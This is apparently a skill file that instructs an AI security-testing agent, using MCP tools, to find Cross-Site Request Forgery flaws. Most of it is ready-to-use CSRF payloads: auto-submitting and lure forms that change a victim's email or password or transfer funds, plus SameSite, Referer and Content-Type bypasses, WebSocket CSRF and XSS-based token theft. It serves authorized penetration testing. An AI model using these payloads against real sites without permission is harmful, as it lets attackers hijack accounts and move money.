# CSRF Detection Skill

## Objective
Identify Cross-Site Request Forgery (CSRF) vulnerabilities where state-changing actions lack proper anti-CSRF protections.

## Instructions

### 1. Identify State-Changing Actions
Look for requests that perform sensitive operations:
- Password change
- Email change
- Account settings update
- Fund transfers
- Admin operations
- Delete actions
- Privilege changes
- API key generation

### 2. Check for Anti-CSRF Protections

**Common protections:**
- CSRF tokens in forms/headers
- SameSite cookie attribute
- Custom headers requirement
- Referer/Origin validation
- CAPTCHA for sensitive actions

### 3. Token Analysis

**Check token presence:**
```html
<input type="hidden" name="csrf_token" value="abc123">
<input type="hidden" name="_token" value="abc123">
```

Common token parameter names:
```
csrf_token, _token, authenticity_token, csrfmiddlewaretoken,
__RequestVerificationToken, _csrf, XSRF-TOKEN, X-CSRF-Token
```

**Test token validation:**
1. Remove token entirely
2. Use empty token value
3. Use different user's token
4. Use token from different session
5. Change token value (partial modification)
6. Use old/expired token
7. Use predictable/guessable token

### 4. SameSite Cookie Bypass

**Check cookie attributes:**
```
Set-Cookie: session=abc123; SameSite=None
Set-Cookie: session=abc123; SameSite=Lax
Set-Cookie: session=abc123; SameSite=Strict
```

**SameSite=Lax bypass (GET-based CSRF):**
```html
<a href="https://vulnerable-website.com/change-email?email=attacker@evil.com">Click me</a>
```

**SameSite=None exploitation:**
```html
<form action="https://vulnerable-website.com/transfer" method="POST">
    <input name="amount" value="10000">
    <input name="to" value="attacker">
    <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```

### 5. Content-Type Bypass

**If server checks Content-Type:**
```html
<!-- Standard form submission (no preflight) -->
<form action="https://vulnerable-website.com/api/update" method="POST" enctype="text/plain">
    <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```

**JSON body via form:**
```html
<form action="https://vulnerable-website.com/api" enctype="text/plain" method="POST">
    <input name='{"email":"attacker@evil.com"}' value=''>
</form>
```

### 6. Referer/Origin Bypass

**Test without Referer:**
```html
<meta name="referrer" content="no-referrer">
<form action="https://vulnerable-website.com/action" method="POST">
    <input name="email" value="attacker@evil.com">
</form>
```

**Test with subdomain Referer:**
```html
<iframe src="https://attacker.vulnerable-website.com/csrf.html"></iframe>
```

**Referer spoofing attempts:**
```
Referer: https://vulnerable-website.com.attacker.com
Referer: https://attacker.com/vulnerable-website.com
```

### 7. Method Override

**Test method override:**
```html
<form action="https://vulnerable-website.com/api?_method=PUT" method="POST">
    <input name="email" value="attacker@evil.com">
</form>
```

HTTP method override headers:
```
X-HTTP-Method-Override: PUT
X-Method-Override: PUT
_method=PUT (in body)
```

### 8. Flash-Based CSRF (Legacy)

For older applications:
```actionscript
var request:URLRequest = new URLRequest("https://vulnerable-website.com/action");
request.method = URLRequestMethod.POST;
request.data = "email=attacker@evil.com";
```

### 9. CSRF via XSS

If XSS exists, CSRF protections can be bypassed:
```javascript
// Extract CSRF token via XSS
var token = document.querySelector('[name="csrf_token"]').value;

// Submit form with valid token
var xhr = new XMLHttpRequest();
xhr.open('POST', '/change-password', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('password=hacked&csrf_token=' + token);
```

### 10. WebSocket CSRF

For WebSocket connections:
```html
<script>
var ws = new WebSocket('wss://vulnerable-website.com/socket');
ws.onopen = function() {
    ws.send('{"action":"transfer","amount":10000}');
};
</script>
```

### 11. PoC Generation

**Basic HTML PoC:**
```html
<!DOCTYPE html>
<html>
<body>
<h1>Click the button to win a prize!</h1>
<form action="https://vulnerable-website.com/change-password" method="POST">
    <input type="hidden" name="password" value="hacked123">
    <input type="submit" value="Claim Prize">
</form>
</body>
</html>
```

**Auto-submit PoC:**
```html
<!DOCTYPE html>
<html>
<body>
<form id="csrfForm" action="https://vulnerable-website.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
```

**Hidden iframe PoC:**
```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://vulnerable-website.com/action" method="POST" target="csrf-frame">
    <input name="data" value="malicious">
</form>
<script>document.forms[0].submit();</script>
```

### 12. Confirm and Document
If confirmed, create finding with:
- Vulnerable endpoint
- Missing/weak protection
- Working PoC HTML
- Impact (what action can be performed)
- Evidence (successful state change)

## MCP Tools to Use
- `http1_request` / `http2_request`: Test without tokens
- `repeater_tab_with_payload`: Manual testing
- `params_extract`: Identify token parameters
- `issue_create`: Report confirmed finding

## References
- PayloadsAllTheThings/CSRF
- OWASP CSRF Prevention Cheat Sheet
- PortSwigger CSRF Research
